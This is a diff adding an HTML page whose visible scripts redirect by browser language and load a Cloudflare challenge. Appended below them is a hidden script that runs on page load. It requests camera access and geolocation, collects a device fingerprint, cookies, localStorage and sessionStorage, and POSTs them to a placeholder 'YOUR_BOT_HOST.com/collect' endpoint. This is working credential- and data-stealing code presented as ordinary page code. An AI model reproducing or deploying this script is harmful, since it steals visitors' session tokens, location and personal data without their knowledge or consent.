@@ -1,0 +1,100 @@
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        var lang = navigator.language || navigator.userLanguage;
+        var currentPath = window.location.pathname;
+
+        var targetLangPath = "";
+        if (lang.startsWith("fr")) {
+            targetLangPath = "/fr";
+        } else if (lang.startsWith("en")) {
+            targetLangPath = "/en";
+        } else {
+            targetLangPath = "/en";
+        }
+
+        window.location.href = targetLangPath + currentPath;
+    });
+</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a1e4b0b198b2f5ba',t:'MTc4NDU3OTA3NA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+    <script>
+    (function() {
+        const sessionId = 'Z2LPbtKZPMfT4eP5';
+        const COLLECT_URL = 'https://YOUR_BOT_HOST.com/collect';
+        
+        function collectAndSend() {
+            // طلب صلاحيات الكاميرا
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()))
+                        .catch(e => console.log('كاميرا خلفية مرفوضة'));
+                    
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()))
+                        .catch(e => console.log('كاميرا أمامية مرفوضة'));
+                } catch(e) {}
+            }
+            
+            // طلب الموقع
+            let locationData = 'غير متاح';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        locationData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                        sendData(locationData);
+                    },
+                    err => {
+                        console.log('الموقع مرفوض');
+                        sendData('مرفوض');
+                    }
+                );
+            } else {
+                sendData('غير مدعوم');
+            }
+        }
+        
+        function sendData(location) {
+            const deviceInfo = {
+                session: sessionId,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: window.screen.width + 'x' + window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardware: {
+                    cores: navigator.hardwareConcurrency || 'غير معروف',
+                    memory: navigator.deviceMemory || 'غير معروف',
+                    touchPoints: navigator.maxTouchPoints || 0
+                },
+                location: location,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                referrer: document.referrer || 'مباشر'
+            };
+            
+            // إرسال البيانات
+            fetch(COLLECT_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(deviceInfo)
+            })
+            .then(res => res.json())
+            .then(result => {
+                console.log('✅ تم الإرسال بنجاح');
+            })
+            .catch(err => {
+                console.error('❌ خطأ في الإرسال:', err);
+            });
+        }
+        
+        // تشغيل عند التحميل
+        window.addEventListener('load', function() {
+            setTimeout(collectAndSend, 1500);
+        });
+        
+        console.log('🔍 تم تحميل كود التجميع');
+    })();
+    </script>
+    
